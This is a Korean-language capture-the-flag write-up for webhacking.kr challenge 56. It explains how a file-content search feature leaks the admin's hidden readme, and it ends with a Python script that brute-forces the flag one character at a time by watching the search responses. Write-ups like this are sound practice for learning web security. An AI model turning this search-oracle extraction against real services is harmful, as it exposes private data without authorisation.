<img width="289" alt="스크린샷 2020-01-07 오후 11 57 08" src="https://user-images.githubusercontent.com/54495632/71904528-a2df5200-31a9-11ea-9950-606fc457c3df.png">

56번

<img width="471" alt="스크린샷 2020-01-07 오후 11 57 20" src="https://user-images.githubusercontent.com/54495632/71904556-b4285e80-31a9-11ea-8868-783937c8d247.png">

db 구조인 것 같다 . 우선 readme 와 hi~ 를 눌러보았다.

<img width="216" alt="스크린샷 2020-01-07 오후 11 57 35" src="https://user-images.githubusercontent.com/54495632/71904599-c7d3c500-31a9-11ea-9a36-345cde8c0fe6.png">

readme 권한을 얻어 열어봐야되는 문제인 것 같다.

접근을 거부 당했다.

<img width="162" alt="스크린샷 2020-01-07 오후 11 58 36" src="https://user-images.githubusercontent.com/54495632/71904636-d7530e00-31a9-11ea-9d25-958f6d8ad85f.png">

hi~ 는 딱히 별게 없었다.

이제 search 에 여러 검색어를 입력해보았다.

<img width="452" alt="스크린샷 2020-01-08 오전 12 48 42" src="https://user-images.githubusercontent.com/54495632/71908097-b8a44580-31b0-11ea-9788-274aac71fa9b.png">

<img width="444" alt="스크린샷 2020-01-08 오전 12 48 51" src="https://user-images.githubusercontent.com/54495632/71908102-bb9f3600-31b0-11ea-94e8-fc33e034f6c2.png">

<img width="504" alt="스크린샷 2020-01-08 오전 12 48 57" src="https://user-images.githubusercontent.com/54495632/71908115-bfcb5380-31b0-11ea-8bee-218f696d5f1a.png">

입력과 결과 값을 여러 번 반복하다 보니 해당 search 는 파일안의 내용에 따라 검색 되는 것 같다.

아까 위에서 hi~ 파일을 읽었을 때 hello~ 라는 문장이 나왔는데 search 로 hello~ 라고 검색하니

예상과 같이 guest hi~ 파일만 검색결과로 나타났다.

<img width="445" alt="스크린샷 2020-01-08 오전 12 59 03" src="https://user-images.githubusercontent.com/54495632/71908855-1edd9800-31b2-11ea-93aa-1354eac630e8.png">

혹시나 싶어 검색어로 FLAG 를 입력하니 

<img width="480" alt="스크린샷 2020-01-08 오전 1 00 01" src="https://user-images.githubusercontent.com/54495632/71908916-374db280-31b2-11ea-8807-b175c261fe2a.png">

다음과 같이 admin 의 readme 파일만 예상대로 나왔다.

이제 한글자 한글자 씩 비교하며 FLAG 값을 찾아야되는데 파이썬의 request를 이용하였다.

<img width="554" alt="스크린샷 2020-01-08 오전 1 24 27" src="https://user-images.githubusercontent.com/54495632/71910738-d32ced80-31b5-11ea-819c-90a26b469dd4.png">

FLAG 값을 파이썬을 이용하여 구하였다. 코드는 제공하기 싫다.

<img width="346" alt="스크린샷 2020-01-08 오전 1 24 42" src="https://user-images.githubusercontent.com/54495632/71910777-e3dd6380-31b5-11ea-92d2-00a1e67673e4.png">

<img width="401" alt="스크린샷 2020-01-08 오전 1 24 46" src="https://user-images.githubusercontent.com/54495632/71910784-e8a21780-31b5-11ea-9648-9a6287dceb69.png">


import requests

cookies={'PHPSESSID':'ㄴㅓ의 쿠키 값'}
url="https://webhacking.kr/challenge/web-33/index.php"
flag="flag{"
data={'search':""}

for i in range(0,100):
    for j in range(38,127):

        data['search']=flag+chr(j)

        res=requests.post(url,cookies=cookies,data=data)
        if((res.text).find("admin")>0):
            flag+=chr(j)
            print ("flag :"+flag)
            break

print ("finish flag :"+flag)
